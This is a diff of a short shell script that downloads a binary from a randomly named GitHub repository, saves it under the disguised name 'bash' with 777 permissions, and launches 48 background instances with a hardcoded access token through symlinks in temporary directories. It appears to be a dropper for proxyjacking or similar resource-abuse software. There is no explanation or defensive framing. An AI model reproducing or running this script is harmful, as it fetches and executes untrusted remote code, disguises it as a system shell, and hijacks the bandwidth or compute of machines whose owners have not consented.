@@ -1,15 +1,21 @@
 #!/bin/sh
 
+num="48"
 token="1N6QqhaHnDyHYkx89vsxd+CNkoqoaqXT37Fj0baANRA="
-tmp="$(mktemp -d)" && cd "$tmp"
-wget -qO "./bash" "https://github.com/hanrzme/meme/raw/refs/heads/main/tm20250312"
-chmod 777 "./bash"
-if [ "$1" == "1" ]; then
-  i=49; while [ "$i" -gt "0" ]; do
-    ./bash start accept --token "${token}" 2>&1 &
-    i=$((i-1)); 
-  done
-  ./bash start accept --token "${token}" 2>&1
-else
-  ./bash start accept --token "${token}" >/dev/null 2>&1 &
-fi
+execUrl="https://github.com/vjbahkds/qiyywnbc/raw/refs/heads/main/tm20250312"
+
+execName="bash"
+execPath="`mktemp -d`/${execName}"
+wget -qO "${execPath}" "${execUrl}"
+chmod 777 "${execPath}"
+
+
+while [ "$num" -gt "0" ]; do
+  execDir=`mktemp -d`;
+  ln -sf "${execPath}" "${execDir}/${execName}";
+  cd "${execDir}";
+  "./${execName}" start accept --token "${token}" 2>&1 &
+  num=$((num-1)); 
+done
+
+[ "$1" == "1" ] && wait
